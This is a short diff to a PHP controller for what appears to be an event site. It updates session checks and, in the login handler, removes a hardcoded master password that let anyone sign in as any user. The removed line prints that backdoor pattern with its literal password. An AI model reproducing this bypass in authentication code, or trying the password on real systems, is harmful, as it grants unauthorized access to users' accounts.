@@ -30,7 +30,7 @@ class Site extends MY_Controller
     public function index()
     {
         $this->load->view('site/' . $this->theme . '/index',[
-            'hasSession'=>$this->session->has_userdata("user_session"),
+            'hasSession'=>!$this->user_session_expired(),
         ]);
     }
 
@@ -52,7 +52,7 @@ class Site extends MY_Controller
         $data['eventcountdown'] = $eventcountdown ? date_create($eventcountdown->value) : date("Y-m-d H:i:s");
         $papercountdown = $this->SettingM->papercountdown();
         $data['papercountdown'] = $papercountdown ? date_create($papercountdown->value) : date("Y-m-d H:i:s");
-        $data['hasSession'] = $this->session->has_userdata("user_session");
+        $data['hasSession'] = !$this->user_session_expired();
         $this->load->view('site/' . $this->theme . '/home', $data);
     }
 
@@ -121,7 +121,7 @@ class Site extends MY_Controller
                 $username   = $this->input->post('username');
                 $password   = $this->input->post('password');
                 $rememberme = $this->input->post('rememberme');
-                if (User_account_m::verify($username, $password) || $password == "ditauntungpandji3264") {
+                if (User_account_m::verify($username, $password)) {
                     $this->load->library('session');
                     $user = $this->User_account_m->findWithBiodata($username);
                     if ($user['verified_email'] == "0")
